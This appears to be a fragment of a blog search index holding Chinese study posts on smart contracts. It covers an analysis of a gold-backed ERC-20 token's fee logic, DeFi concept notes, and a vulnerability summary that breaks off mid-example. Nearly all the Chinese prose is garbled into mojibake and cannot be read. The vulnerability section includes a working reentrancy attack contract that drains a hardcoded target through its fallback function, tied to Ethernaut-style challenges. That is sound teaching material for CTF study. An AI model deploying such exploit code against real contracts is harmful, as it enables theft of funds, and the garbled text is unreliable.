 &#125;\n&#125;\n\nAnalyzeæœ¬è´¨ä¸Šå±žäºŽERC-20 tokenå…·å¤‡å…¶åŸºæœ¬åŠŸèƒ½ï¼Œä½†åˆé¢å¤–æœ‰ä¸€äº›è‡ªèº«çš„ç‰¹ç‚¹ï¼Œä¸‹æ–‡è¿›è¡Œåˆ†æž\nfunction addBackedTokens(uint256 value) external onlyOwner returns (bool)\n  &#123;\n    uint256 unbackedBalance = _balances[_unbackedTreasury];\n    uint256 lockedGrams =  LockedGoldOracle(_oracle).lockedGold();\n    require(lockedGrams >= totalCirculation().add(value),\n            \"Insufficent grams locked in LockedGoldOracle to complete operation\");\n    if (value &lt;= unbackedBalance) &#123;\n      _transfer(_unbackedTreasury, _backedTreasury, value);\n    &#125; else &#123;\n      if (unbackedBalance > 0) &#123;\n        _transfer(_unbackedTreasury, _backedTreasury, unbackedBalance);\n      &#125;\n      _mint(value.sub(unbackedBalance));\n    &#125;\n    emit AddBackedGold(value);\n    return true;\n  &#125;\n  function payStorageFee() external returns (bool) &#123;\n    _updateActivity(msg.sender);\n    _payStorageFee(msg.sender);\n    return true;\n  &#125;\n\nè¯¥å‡½æ•°å®žçŽ°äº†é“¸é€ tokençš„åŠŸèƒ½ï¼ˆæ³¨æ„unbackedTreasuryå†…çš„ä»£å¸åªå¯ä»¥è½¬è´¦åˆ°backedTreasuryï¼‰ï¼Œä»Žè€Œå³å¯å¢žåŠ backedTreasuryåœ°å€ä¸‹çš„tokenæ•°é‡ï¼Œå¦‚æžœunbackedTreasuryä½™é¢ä¸è¶³å°†å…¨éƒ¨è½¬å‡ºåœ¨è¿›è¡Œmint\nfunction payStorageFee() external returns (bool) &#123;\n    _updateActivity(msg.sender);\n    _payStorageFee(msg.sender);\n    return true;\n  &#125;\n\næ­¤å‡½æ•°å®žçŽ°äº†æ”¯ä»˜StorageFeeçš„åŠŸèƒ½\nä¸‹è¾¹æ˜¯ä¸€å¤§å †çš„å…³äºŽsetå‡½æ•°ï¼Œæ¯”è¾ƒç®€å•è¿™é‡Œå°±ä¸è¯´äº†\nfunction forcePayFees(address account) external onlyEnforcer returns(bool) &#123;\n   require(account != address(0));\n   require(_balances[account] > 0,\n           \"Account has no balance, cannot force paying fees\");\n   if (isInactive(account)) &#123;\n     uint256 paid = _payInactiveFee(account);\n     require(paid > 0);\n   &#125; else if (_shouldMarkInactive(account)) &#123;\n     _setInactive(account);\n   &#125; else &#123;\n     require(daysSincePaidStorageFee(account) >= YEAR,\n             \"Account has paid storage fees more recently than 365 days\");\n     uint256 paid = _payStorageFee(account);\n     require(paid > 0, \"No appreciable storage fees due, will refund gas\");\n   &#125;\n &#125;\n\nå¼ºåˆ¶æ‰§è¡Œæ”¯ä»˜æ‰‹ç»­è´¹æ“ä½œï¼Œåªæœ‰Enforcerå¯ä»¥è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œä¸æ´»è·ƒè´¦æˆ·å°±æ”¯ä»˜InactiveFeeï¼Œå¦åˆ™æ”¯ä»˜StorageFeeï¼Œelifåˆ™æ˜¯æ£€æµ‹è´¦æˆ·æ˜¯å¦éœ€è¦è¢«æ ‡è®°ä¸ºä¸æ´»è·ƒè´¦æˆ·ï¼Œå¦‚æžœéœ€è¦å°±ä¼šåœ¨setInactiveå‡½æ•°ä¸‹å°†è´¦æˆ·è®¾ç½®ä¸ºä¸æ´»è·ƒè´¦æˆ·ï¼ŒåŒæ—¶æ‰£é™¤æŽ‰ä¸¤ç§è´¹ç”¨\nfunction calcStorageFee(address account) public view returns(uint256) &#123;\n    uint256 balance = _balances[account];\n    if (isInactive(account) || isStorageFeeExempt(account) || balance == 0) &#123;\n      return 0;\n    &#125;\n    uint256 daysSinceStoragePaid = daysSincePaidStorageFee(account);\n    uint256 daysInactive = daysSinceActivity(account);\n    uint256 gracePeriod = _storageFeeGracePeriod[account];\n    if (gracePeriod > 0) &#123;\n      if (daysSinceStoragePaid > gracePeriod) &#123;\n        daysSinceStoragePaid = daysSinceStoragePaid.sub(gracePeriod);\n      &#125; else &#123;\n        daysSinceStoragePaid = 0;\n      &#125;\n    &#125;\n    if (daysSinceStoragePaid == 0) &#123;\n      return 0;\n    &#125;\n    if (daysInactive >= INACTIVE_THRESHOLD_DAYS) &#123;\n      daysSinceStoragePaid = daysSinceStoragePaid.sub(daysInactive.sub(INACTIVE_THRESHOLD_DAYS));\n    &#125;\n    return storageFee(balance, daysSinceStoragePaid);\n  &#125;\n  function storageFee(uint256 balance, uint256 daysSinceStoragePaid) public pure returns(uint256) &#123;\n    uint256 fee = balance.mul(TOKEN).mul(daysSinceStoragePaid).div(YEAR).div(STORAGE_FEE_DENOMINATOR);\n    if (fee > balance) &#123;\n      return balance;\n    &#125;\n    return fee;\n  &#125;\n\nä»¥ä¸Šä¸¤ä¸ªå‡½æ•°çš„é…åˆè¾¾åˆ°äº†è®¡ç®—storageFeeçš„åŠŸèƒ½ï¼Œå¹¶è®¾ç½®æœ‰å®½é™æœŸï¼Œå†å®½é™æœŸå†…è·ç¦»ä¸Šæ¬¡æ”¯ä»˜storageFeeçš„æ—¶é—´ä¸º0ï¼Œå†å®½é™æœŸå¤–ï¼Œå°†ä¸ºæ—¶é—´é—´éš”å‡åŽ»å®½é™æœŸï¼Œå†å°†balanceï¼ŒdaysSinceStoragePaidä½œä¸ºå‚æ•°ä¼ é€’ç»™storageFee()å‡½æ•°ï¼ˆæ‹–æ¬ è¶Šä¹…ï¼ŒstorageFeeè¶Šé«˜ï¼Œç›´åˆ°ä½™é¢æ€»æ•°ï¼‰\nfunction _calcInactiveFeePerYear(uint256 snapshotBalance) internal pure returns(uint256) &#123;\n   uint256 inactiveFeePerYear = snapshotBalance.mul(TOKEN).div(INACTIVE_FEE_DENOMINATOR);\n   if (inactiveFeePerYear &lt; TOKEN) &#123;\n     return TOKEN;\n   &#125;\n   return inactiveFeePerYear;\n &#125;\n function _calcInactiveFee(uint256 balance,\n                       uint256 daysInactive,\n                       uint256 feePerYear,\n                       uint256 paidAlready) internal pure returns(uint256) &#123;\n   uint256 daysDue = daysInactive.sub(INACTIVE_THRESHOLD_DAYS);\n   uint256 totalDue = feePerYear.mul(TOKEN).mul(daysDue).div(YEAR).div(TOKEN).sub(paidAlready);\n   if (totalDue > balance || balance.sub(totalDue) &lt;= 200) &#123;\n     return balance;\n   &#125;\n   return totalDue;\n &#125;\n\ncalcInactiveFee()å‡½æ•°è°ƒç”¨å¦‚ä¸Šä¸¤ä¸ªå‡½æ•°è®¡ç®—InactiveFee\nfunction _updateActivity(address account) internal &#123;\n   if (_shouldMarkInactive(account)) &#123;\n     _setInactive(account);\n   &#125;\n   if (isInactive(account)) &#123;\n     _payInactiveFee(account);\n     _inactiveFeePerYear[account] = 0;\n     _timeStorageFeePaid[account] = block.timestamp;\n     emit AccountReActive(account);\n   &#125;\n   _timeLastActivity[account] = block.timestamp;\n &#125;\n\nåˆçº¦åœ¨ç”¨æˆ·ä»»ä½•ä¸€æ¬¡è°ƒç”¨å‡½æ•°è¿›è¡Œäº¤æ˜“æ—¶å€™ä¼šè¿›è¡Œ_updateActivity(msg.sender)æ“ä½œæ›´æ–°æ´»è·ƒæ€§ï¼Œè®°å½•ä¸‹æœ¬æ¬¡äº¤æ˜“æ—¶é—´\nåˆçº¦å®žçŽ°äº†åœ¨è½¬è´¦æ—¶æ‰£é™¤ä¸€å®šçš„æ‰‹ç»­è´¹çš„åŠŸèƒ½ï¼Œä»£ç å¦‚ä¸‹ï¼Œæœ‰StorageFeeå’Œtransferfeeã€‚å­˜åœ¨æœ‰å…æ‰‹ç»­è´¹åœ°å€ï¼Œå³transferFeeExemptå’ŒstorageFeeExempt\nfunction _transfer(address from, address to, uint256 value) internal &#123;\n   _transferRestrictions(to, from);\n   // If the account was previously inactive and initiated the transfer, the\n   // inactive fees and storage fees have already been paid by the time we get here\n   // via the _updateActivity() call\n   uint256 storageFeeFrom = calcStorageFee(from);\n   uint256 storageFeeTo = 0;\n   uint256 allFeeFrom = storageFeeFrom;\n   uint256 balanceFromBefore = _balances[from];\n   uint256 balanceToBefore = _balances[to];\n   // If not sending to self can pay storage and transfer fee\n   if (from != to) &#123;\n     // Need transfer fee and storage fee for receiver if not sending to self\n     allFeeFrom = allFeeFrom.add(calcTransferFee(from, value));\n     storageFeeTo = calcStorageFee(to);\n     _balances[from] = balanceFromBefore.sub(value).sub(allFeeFrom);\n     _balances[to] = balanceToBefore.add(value).sub(storageFeeTo);\n     _balances[_feeAddress] = _balances[_feeAddress].add(allFeeFrom).add(storageFeeTo);\n   &#125; else &#123;\n     // Only storage fee if sending to self\n     _balances[from] = balanceFromBefore.sub(storageFeeFrom);\n     _balances[_feeAddress] = _balances[_feeAddress].add(storageFeeFrom);\n   &#125;\n   // Regular Transfer\n   emit Transfer(from, to, value);\n   // Fee transfer on `from` address\n   if (allFeeFrom > 0) &#123;\n     emit Transfer(from, _feeAddress, allFeeFrom);\n     if (storageFeeFrom > 0) &#123;\n       _timeStorageFeePaid[from] = block.timestamp;\n       _endGracePeriod(from);\n     &#125;\n   &#125;\n   // If first time receiving coins, set the grace period\n   // and start the the activity clock and storage fee clock\n   if (_timeStorageFeePaid[to] == 0) &#123;\n     // We may change the grace period in the future so we want to\n     // preserve it per address so there is no retroactive deduction\n     _storageFeeGracePeriod[to] = _storageFeeGracePeriodDays;\n     _timeLastActivity[to] = block.timestamp;\n     _timeStorageFeePaid[to] = block.timestamp;\n   &#125;\n   // Fee transfer on `to` address\n   if (storageFeeTo > 0) &#123;\n     emit Transfer(to, _feeAddress, storageFeeTo);\n     _timeStorageFeePaid[to] = block.timestamp;\n     _endGracePeriod(to);\n   &#125; else if (balanceToBefore &lt; MIN_BALANCE_FOR_FEES) &#123;\n     // MIN_BALANCE_FOR_FEES is the minimum amount in which a storage fee\n     // would be due after a sigle day, so if the balance is above that,\n     // the storage fee would always be greater than 0.\n     //\n     // This avoids the following condition:\n     // 1. User receives tokens\n     // 2. Users sends all but a tiny amount to another address\n     // 3. A year later, the user receives more tokens. Because\n     // their previous balance was super small, there were no appreciable\n     // storage fee, therefore the storage fee clock was not reset\n     // 4. User now owes storage fees on entire balance, as if they\n     // held tokens for 1 year, instead of resetting the clock to now.\n     _timeStorageFeePaid[to] = block.timestamp;\n   &#125;\n   // If transferring to unbacked treasury, tokens are being taken from\n   // circulation, because gold is being 'unlocked' from the vault\n   if (to == _unbackedTreasury) &#123;\n     emit RemoveGold(value);\n   &#125;\n &#125;\n  function _transferRestrictions(address to, address from) internal view &#123;\n   require(from != address(0));\n   require(to != address(0));\n   require(to != address(this), \"Cannot transfer tokens to the contract\");\n   if (from == _unbackedTreasury) &#123;\n     require(to == _backedTreasury,\n             \"Unbacked treasury can only transfer to backed treasury\");\n   &#125;\n   if (from == _redeemAddress) &#123;\n     require((to == _unbackedTreasury) || (to == _backedTreasury),\n             \"Redeem address can only transfer to treasury\");\n   &#125;\n   if (to == _unbackedTreasury) &#123;\n     require((from == _backedTreasury) || (from == _redeemAddress),\n             \"Unbacked treasury can only receive from redeem address and backed treasury\");\n   &#125;\n   if (to == _backedTreasury) &#123;\n     require((from == _unbackedTreasury) || (from == _redeemAddress),\n             \"Only unbacked treasury and redeem address can transfer to backed treasury\");\n   &#125;\n &#125;\n\ntransferå‡½æ•°é…åˆ_transferRestrictionså‡½æ•°å®žçŽ°äº†æ‰‹ç»­è´¹çš„æ‰£é™¤ï¼Œä»¥åŠå¯¹è½¬è´¦æ“ä½œçš„é™åˆ¶ï¼ˆé™åˆ¶äº†unbackedTreasuryï¼ŒredeemAddressä»¥åŠunbackedTreasuryåœ°å€ä¸‹çš„tokençš„æ¥ï¼ŒåŽ»ï¼‰åŒæ—¶å®žçŽ°äº†activityçš„æ›´æ–°ï¼Œå®½é™æœŸçš„ç»“æŸç­‰åŠŸèƒ½\nfunction _simulateTransfer(address from, address to, uint256 value) internal view returns (uint256[5] memory) &#123;\n    uint256[5] memory ret;\n    ret[0] = calcOwedFees(from);\n    ret[1] = 0;\n    ret[2] = 0;\n    if (from != to) &#123;\n      ret[1] = calcOwedFees(to);\n      ret[2] = calcTransferFee(from, value);\n      ret[3] = _balances[from].sub(value).sub(ret[0]).sub(ret[2]);\n      ret[4] = _balances[to].add(value).sub(ret[1]);\n    &#125; else &#123;\n      ret[3] = _balances[from].sub(ret[0]);\n      ret[4] = ret[3];\n    &#125;\n    return ret;\n  &#125;\n\næ¨¡æ‹Ÿè½¬è´¦åŠŸèƒ½ï¼Œfeom!&#x3D;toå°±æ˜¯åŠ å‡å¯¹åº”çš„feeä»¥åŠè½¬è´¦valueï¼Œå¦åˆ™å°±æ˜¯ç›´æŽ¥æ‰£é™¤å¯¹åº”fee\nfunction calcSendAllBalance(address account) public view returns (uint256) &#123;\n   require(account != address(0));\n   uint256 balanceAfterStorage = _balances[account].sub(calcOwedFees(account));\n   if (_transferFeeBasisPoints == 0 || isTransferFeeExempt(account)) &#123;\n     return balanceAfterStorage;\n   &#125;\n   if (balanceAfterStorage &lt;= 1) &#123;\n     return 0;\n   &#125;\n   uint256 divisor = TOKEN.add(_transferFeeBasisPoints.mul(BASIS_POINTS_MULTIPLIER));\n   uint256 sendAllAmount = balanceAfterStorage.mul(TOKEN).div(divisor).add(1);\n   uint256 transFee = sendAllAmount.mul(_transferFeeBasisPoints).div(BASIS_POINTS_MULTIPLIER);\n   if (sendAllAmount.add(transFee) > balanceAfterStorage) &#123;\n     return sendAllAmount.sub(1);\n   &#125;\n   return sendAllAmount;\n &#125;\n\nè®¡ç®—ä½™é¢ï¼ŒtransferFeeBasisPointsä¸º0ä»¥åŠisTransferFeeExemptçš„æƒ…å†µä¸‹ï¼Œä½™é¢å°±æ˜¯å½“å‰ä½™é¢å‡åŽ»å¯¹åº”çš„feeï¼Œå…¶ä»–æƒ…å†µä¸‹å¯¹åº”å…¬å¼è¿›è¡Œè®¡ç®—ã€‚\n","slug":"learn of token","date":"2022-08-01T11:07:30.271Z","categories_index":"","tags_index":"åŒºå—é“¾ ctf","author_index":"bcYng"},{"id":"ffdc2c15bd4d362ddf4d91f867ac761d","title":"Learn of Defi","content":"\n\n\n\n1.Defi\nWHATï¼Ÿé‡‘èžåŸºç¡€è®¾æ–½ä½œä¸ºå»ºç«‹åœ¨å…¬å…±æ™ºèƒ½åˆçº¦å¹³å°ä¸Šçš„å¼€æ”¾ã€æ— éœ€è®¸å¯ä¸”é«˜åº¦å¯äº’æ“ä½œçš„åè®®æ ˆ\n\nWHYï¼ŸDefi â€˜s advantage: \n\nå¼€æºç³»ç»Ÿï¼›å»ºç«‹åœ¨æ— éœ€è®¸å¯çš„åŒºå—é“¾\nä»»ä½•äººéƒ½å¯ä»¥åœ¨ä¸ç»è¿‡ç¬¬ä¸‰æ–¹å…è®¸çš„æƒ…å†µä¸‹ä½¿ç”¨&#x2F;äº’æ“ä½œæˆ–åœ¨ä¸Šé¢æž„å»º\nç”¨æˆ·æ— éœ€æä¾›çœŸå®žèº«ä»½\næ²¡æœ‰å•ä¸ªå®žä½“è´Ÿè´£å‡çº§å†³ç­–å’Œç®¡ç†å‘˜æƒé™\nèµ„äº§ä¸å—å•ä¸€ç¬¬ä¸‰æ–¹æ‰˜ç®¡\n\nç›¸æ¯”äºŽä¼ ç»ŸTraditional financeï¼ˆCefiï¼‰é¿å…äº†ä»¥ä¸‹é—®é¢˜:\n\nè´¦æˆ·èµ„äº§åŠå¯è¢«å†»ç»“\näº¤æ˜“ä¸­ä»‹å¯ä»¥å®¡æŸ¥äº¤æ˜“å¹¶ä¸”æ”¶å–è´¹ç”¨\nå®¢æˆ·å¯¹äºŽæœåŠ¡æä¾›å•†æ²¡æœ‰éšç§ï¼ŒæœåŠ¡è€…çŸ¥é“å®¢æˆ·çš„çœŸå®žèº«ä»½å’Œå®Œæ•´çš„è´¦æˆ·&#x2F;äº¤æ˜“ä¿¡æ¯\nä¸é€æ˜Žã€å­¤ç«‹çš„æ•°æ®åº“å’Œåº”ç”¨ç¨‹åºï¼ˆåœ¨Defiä¸­æ•°æ®å…¬å¼€é€æ˜Žï¼‰\n\n\n\néœ€è¦è¢«ä¿¡ä»»æ‰èƒ½æ­£ç¡®å®‰å…¨åœ°è¿è¡Œ\n\n2.BlockchainWHAT?åˆ†ä¸ºå¦‚ä¸‹å››å±‚ï¼š\nlayer4ï¼šuser facing tools (cloud servers)\nlayer3ï¼šapplications (DAPPs, smart contracts)\nlayer2ï¼šcompute layer (blockchain computer)\nlayer1ï¼šconsensus layer\nconsensus layerï¼š\næŒä¹…æ€§ï¼šä¸€æ—¦æ·»åŠ ï¼Œæ•°æ®å°†æ°¸è¿œæ— æ³•åˆ é™¤\nå…±è¯†æ€§ï¼šæ‰€æœ‰è¯šå®žçš„å‚ä¸Žè€…æ‹¥æœ‰ç›¸åŒçš„æ•°æ®\næ´»è·ƒæ€§ï¼šè¯šå®žçš„å‚ä¸Žè€…å¯ä»¥æ·»åŠ æ–°çš„äº¤æ˜“\nå¼€æ”¾æ€§ï¼šä»»ä½•äººéƒ½å¯ä»¥æ·»åŠ æ•°æ®\nCompute layerï¼š\nDAPP é€»è¾‘è¢«ç¼–ç åœ¨åŒºå—é“¾ä¸Šè¿è¡Œçš„ç¨‹åºä¸­è§„åˆ™ç”±å…¬å…±ç¨‹åºæ‰§è¡Œï¼ˆå…¬å…±æºä»£ç ï¼‰\næ²¡æœ‰å•ä¸€çš„å—ä¿¡ä»»çš„ç¬¬ä¸‰è€…\nDAPPç¨‹åºç”±åˆ›å»ºæ–°åŒºå—çš„å„æ–¹æ‰§è¡Œå…¬å…±å¯éªŒè¯æ€§ï¼šæ¯ä¸ªäººéƒ½å¯ä»¥éªŒè¯äº¤æ˜“çŠ¶æ€\nApplications  layerï¼š\nDAPPsï¼Œsmart contracts\nuser facing tools layerï¼š\n\n3.smart contractsWHATTheyâ€™re neither smart nor contracts! Developerâ€™s perspective: Program objects on the blockchain\nSzabo äºŽ 1994 å¹´æå‡ºçš„â€œæ™ºèƒ½åˆçº¦â€\næ™ºèƒ½åˆçº¦æ˜¯ä¸€ç§è®¡ç®—æœºåŒ–äº¤æ˜“åè®®æ‰§è¡ŒåˆåŒæ¡æ¬¾ã€‚æ€»ä½“ç›®æ ‡æ˜¯æ»¡è¶³å…±åŒçš„åˆåŒæ¡ä»¶ï¼ˆä¾‹å¦‚ä»˜æ¬¾æ¡æ¬¾ã€ç•™ç½®æƒã€ä¿å¯†æ€§å’Œç”šè‡³å¼ºåˆ¶æ‰§è¡Œï¼‰ï¼Œæœ€å¤§é™åº¦åœ°å‡å°‘æ¶æ„å’Œå¶ç„¶çš„ï¼Œå¹¶æœ€å¤§é™åº¦åœ°å‡å°‘å¯¹å—ä¿¡ä»»çš„éœ€æ±‚ä¸­ä»‹ã€‚ç›¸å…³çš„ç»æµŽç›®æ ‡åŒ…æ‹¬é™ä½Žæ¬ºè¯ˆæŸå¤±ã€ä»²è£å’Œæ‰§è¡Œè´¹ç”¨ï¼Œä»¥åŠå…¶ä»–äº¤æ˜“æˆæœ¬ã€‚\nåˆçº¦ç±»ï¼šä¸ºä¸€ä¸ªåˆçº¦å®šä¹‰ç¨‹åºä»£ç å’Œå­˜å‚¨å˜é‡åˆåŒ\nåˆçº¦å¯¹è±¡ï¼šå­˜åœ¨äºŽåŒºå—é“¾ä¸Šçš„ç±»çš„ä¸€ä¸ªå®žä¾‹\nå­˜å‚¨å­—æ®µï¼šåˆçº¦å­˜å‚¨çš„å˜é‡\nå‡½æ•°&#x2F;æ–¹æ³•ï¼šå¯ä»¥è°ƒç”¨æ¥è¿è¡Œç»™å®šçš„ä»£ç ï¼Œæ›´æ–°åˆåŒçŠ¶æ€\nè®¿é—®æŽ§åˆ¶ï¼šå¦‚æžœä¸æ˜¯ï¼Œä½¿ç”¨â€œrequire()â€å–æ¶ˆäº¤æ˜“æŽˆæƒã€‚æ‚¨å¯ä»¥æ£€æŸ¥è°ƒç”¨è¯¥å‡½æ•°çš„è°ƒç”¨è€…\nç»„åˆï¼šå¤šä¸ªåˆçº¦ä¹‹é—´çš„äº¤äº’\n4.DEXWHATåŽ»ä¸­å¿ƒåŒ–äº¤æ˜“å¹³å°ï¼ˆDEXï¼‰æ˜¯ç‚¹å¯¹ç‚¹çš„äº¤æ˜“å¸‚åœºï¼Œç”¨æˆ·å¯ä»¥ç»•è¿‡ä¸­é—´æ–¹ç›´æŽ¥äº¤æ˜“å’Œç®¡ç†cryptocurrencyã€‚DEXå¯ä»¥æ›¿ä»£é“¶è¡Œã€åˆ¸å•†ã€æ”¯ä»˜ç³»ç»Ÿç­‰ä¼ ç»Ÿä¸­ä»‹ï¼Œä½¿ç”¨åŒºå—é“¾æ™ºèƒ½åˆçº¦æ¥äº¤æ˜“èµ„äº§ã€‚\nä¼ ç»Ÿé‡‘èžäº¤æ˜“æµç¨‹å¾€å¾€ç¼ºä¹é€æ˜Žæ€§ï¼Œéœ€è¦ä¾é ä¸­ä»‹æ‰§è¡Œï¼Œè€Œä¸”ä¸­ä»‹çš„è®¸å¤šæ“ä½œéƒ½ä¸å¯¹å¤–å…¬å¼€ã€‚ç›¸æ¯”ä¹‹ä¸‹ï¼ŒDEXå®Œå…¨å…¬å¼€èµ„é‡‘æµå‘å’Œäº¤æ˜“æœºåˆ¶ã€‚å¦å¤–ï¼Œç”±äºŽäº¤æ˜“ä¸­ç”¨æˆ·èµ„é‡‘ä¸ä¼šç»è¿‡ç¬¬ä¸‰æ–¹çš„cryptocurrencyé’±åŒ…ï¼Œå› æ­¤DEXå¯ä»¥é™ä½Žcryptocurrencyç”Ÿæ€ä¸­çš„å¯¹æ‰‹æ–¹é£Žé™©ä»¥åŠç³»ç»Ÿæ€§çš„ä¸­å¿ƒåŒ–é£Žé™©\nDEXæ˜¯åŽ»ä¸­å¿ƒåŒ–é‡‘èžï¼ˆDeFiï¼‰çš„åŸºçŸ³ï¼Œä¹Ÿæ˜¯ä¸å¯æˆ–ç¼ºçš„ä¸€å—â€œè´§å¸ä¹é«˜â€ï¼Œå…·æœ‰æ— éœ€è®¸å¯çš„å¯ç»„åˆæ€§ï¼Œå¹¶å¯ä»¥æ‰“é€ å‡ºæ›´åŠ é«˜çº§çš„é‡‘èžäº§å“ã€‚\nWHYDEX å…·æœ‰æ›´é«˜çš„å®‰å…¨æ€§ï¼Œå› ä¸ºæ— æ³•ç”±äºŽæ²¡æœ‰ä¸­å¤®é›†æƒï¼Œæ”¿åºœå’Œç›‘ç®¡æ›´éš¾æŽ§åˆ¶ä»–ä»¬çš„è®¿é—®è€…ã€‚ æ­¤å¤–ï¼ŒCEX ç»å¸¸é™åˆ¶æŸäº›å›½å®¶ç”¨æˆ·ä½¿ç”¨ä»–ä»¬çš„æœåŠ¡ã€‚ å¯¹DEXé—®é¢˜ï¼Œå› ä¸ºä¸–ç•Œä¸Šä»»ä½•åœ°æ–¹éƒ½æœ‰äº’è”ç½‘è¿žæŽ¥çš„ä»»ä½•äººéƒ½å¯ä»¥ä½¿ç”¨å®ƒä»¬ã€‚ è¿™åˆ›å»ºäº†ä¸€ä¸ªæ›´å…¬å¹³çš„è®¿é—®ç³»ç»Ÿã€‚\n5.On chain lending&amp;borrowHOW\næŠµæŠ¼å“\nç”¨ä½œä¿è¯é‡‘çš„èµ„äº§\nè¶…é¢æŠµæŠ¼\nå€Ÿæ¬¾äººå¿…é¡»æä¾›ä»·å€¼ï¼ˆæŠµæŠ¼èµ„äº§ï¼‰&gt; ä»·å€¼ï¼ˆæŽˆäºˆçš„è´·æ¬¾ï¼‰\næŠµæŠ¼ä¸è¶³\nå³ä»·å€¼ï¼ˆæŠµæŠ¼å“ï¼‰&lt; ä»·å€¼ï¼ˆå€ºåŠ¡ï¼‰\næ¸…ç®—\nå¦‚æžœä»·å€¼ï¼ˆæŠµæŠ¼å“ï¼‰&lt;&#x3D; 150% * ä»·å€¼ï¼ˆå€ºåŠ¡ï¼‰ï¼Œåˆ™ä»»ä½•äººå¯ä»¥æ¸…ç®—å€ºåŠ¡å¤´å¯¸\nå¥åº·å› å­\n\nå½“å¥åº·å› å­ä¸‹è·Œåˆ°1ä»¥ä¸‹ï¼Œå€Ÿæ¬¾å¤´å¯¸å°†ä¼šè¢«æ¸…ç®—\n6.OracleWHATå®žé™…ä¸ŠDeFiä½¿ç”¨çš„å·¥å…·æ˜¯åŽ»ä¸­å¿ƒåŒ–çš„ï¼Œä¸ºäº†ä¿æŒè¿™ç§çŠ¶æ€ï¼Œå®ƒä»¬ä½¿ç”¨çš„æ•°æ®ä¸èƒ½ç”±ä¸­å¿ƒåŒ–çš„æ¥æºæä¾›ï¼Œå› ä¸ºä¸­å¿ƒåŒ–çš„æ¥æºå¯èƒ½ä¼šä¼ªé€ ã€ç¯¡æ”¹ã€ä¿®æ”¹æˆ–éšè—ä¿¡æ¯ã€‚æ­¤å¤–ï¼Œå®ƒä»¬æ‰€åŸºäºŽçš„æ™ºèƒ½åˆçº¦åªå­˜åœ¨äºŽåŒºå—é“¾ä¸Šï¼Œå¹¶ä¸”åªèƒ½è®¿é—®åŒºå—é“¾æœ¬èº«çš„å¯ç”¨æ•°æ®ã€‚\né¢„è¨€æœºå°±æ˜¯ä¸€ç§å¾ˆå¥½çš„è§£å†³åŠžæ³•ï¼ŒDeFiåè®®æ™ºèƒ½åˆçº¦å°†é¢„è¨€æœºä½œä¸ºåŒºå—é“¾ä¹‹å¤–çš„æ•°æ®æ¥æºï¼Œä¾‹å¦‚èµ„äº§å¸‚åœºä»·æ ¼ã€ä½“è‚²èµ›äº‹ç»“æžœã€å¤©æ°”æ•°æ®æˆ–ä»»ä½•å…¶ä»–åœ¨åŒºå—é“¾ä¸Šæ— æ³•èŽ·å¾—çš„ä¿¡æ¯ã€‚ \né¢„è¨€æœºè¢«è®¤ä¸ºæ˜¯åŽ»ä¸­å¿ƒåŒ–åè®®å’ŒåŒºå—é“¾å¤–éƒ¨æ•°æ®ä¹‹é—´çš„æ¡¥æ¢ï¼Œç®€å•æ¥è¯´å°±æ˜¯æ‰¿æŽ¥å†…éƒ¨å’Œå¤–éƒ¨ä¹‹é—´çš„æ•°æ®äº¤æ¢ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆé¢„è¨€æœºæ˜¯Defiæ¦‚å¿µé‡Œé¢å¿…ä¸å¯å°‘çš„ä¸€ä¸ªåŽŸå› ã€‚\n","slug":"Learn-the-mooc-of-Dawn-song","date":"2022-08-01T11:05:08.276Z","categories_index":"","tags_index":"åŒºå—é“¾ ctf","author_index":"bcYng"},{"id":"ffa4ad3cb02d93d241db5e33b2dfae61","title":"Smart Contract Basic Vulnerability Summary","content":"\n\n\n\n1.å…³äºŽè½¬è´¦çš„æ¼æ´žåœ¨solidityä¸­æœ‰ä¸‰ç§è½¬è´¦æ–¹å¼ï¼Œåˆ†åˆ«æ˜¯callï¼Œtransferå’Œsendï¼ŒåŽä¸¤è€…ç›¸å¯¹å®‰å…¨ï¼Œä½†ä¹Ÿåˆ†åˆ«å¯¹åº”ç€æ¼æ´žã€‚\ncallè½¬è´¦æ¼æ´žâ€”â€”é‡å…¥ä¾‹å­ï¼š\npragma solidity ^0.6.0;\n\nimport '@openzeppelin/contracts/math/SafeMath.sol';\n\ncontract Reentrance &#123;\n  \n  using SafeMath for uint256;\n  mapping(address => uint) public balances;\n\n  function donate(address _to) public payable &#123;\n    balances[_to] = balances[_to].add(msg.value);\n  &#125;\n\n  function balanceOf(address _who) public view returns (uint balance) &#123;\n    return balances[_who];\n  &#125;\n\n  function withdraw(uint _amount) public &#123;\n    if(balances[msg.sender] >= _amount) &#123;\n      (bool result,) = msg.sender.call&#123;value:_amount&#125;(\"\");\n      if(result) &#123;\n        _amount;\n      &#125;\n      balances[msg.sender] -= _amount;\n    &#125;\n  &#125;\n\n  receive() external payable &#123;&#125;\n&#125;\n\nåŽŸç†ï¼šcallè½¬è´¦ä¼šè°ƒç”¨æ‰€æœ‰çš„gasï¼Œå¹¶ä¸”è½¬è´¦å‡ºçŽ°å¼‚å¸¸ä¹‹åŽä¸ä¼šæŠ›å‡ºå¼‚å¸¸è€Œæ˜¯è¿”å›žfalse\næ¼æ´žåˆ†æžï¼šç»å…¸çš„é‡å…¥æ¼æ´žï¼Œä½¿ç”¨äº†callè½¬è´¦ï¼Œå¹¶ä¸”balances[msg.sender]åœ¨è½¬è´¦å®Œæˆä¹‹åŽæ‰è¿›è¡Œæ›´æ–°ï¼Œæ‰€ä»¥æž„é€ æ”»å‡»åˆçº¦ä¸­çš„fallbackè§¦å‘å³å¯\ncontract attack&#123;\n    test constant private target=test(0xEdBA908c98185b82b1aBb31AFAF66B2f415491B2);\n    function cunqian() public payable&#123;\n        target.donate&#123;value: 0.001 ether&#125;(address(this));\n    &#125;\n    function tuiqian()public&#123;\n        target.withdraw(0.001 ether);\n    &#125;\n    function check() public view returns(uint)&#123;\n        return address(this).balance;\n    &#125;\n    fallback() external payable&#123;\n        if(address(0xEdBA908c98185b82b1aBb31AFAF66B2f415491B2).balance>=0.001 ether)\n        target.withdraw(0.001 ether);\n    &#125;\n     function reuse() public &#123;\n        msg.sender.transfer(address(this).balance);\n    &#125;\n&#125;\n\nç›¸åº”ä¾‹é¢˜ï¼š\nethernautâ€”â€”re-entrancy https://ethernaut.openzeppelin.com/level/0xe6BA07257a9321e755184FB2F995e0600E78c16D\ncapture the etherâ€”â€”Token bank\nhttps://capturetheether.com/challenges/miscellaneous/token-bank/\ntransferè½¬è´¦æ¼æ´žâ€”â€”æ‹’ç»æœåŠ¡ä¾‹å­ï¼š\npragma solidity ^0.6.0;\n\ncontract King &#123;\n\n  address payable king;\n  uint public prize;\n  address payable public 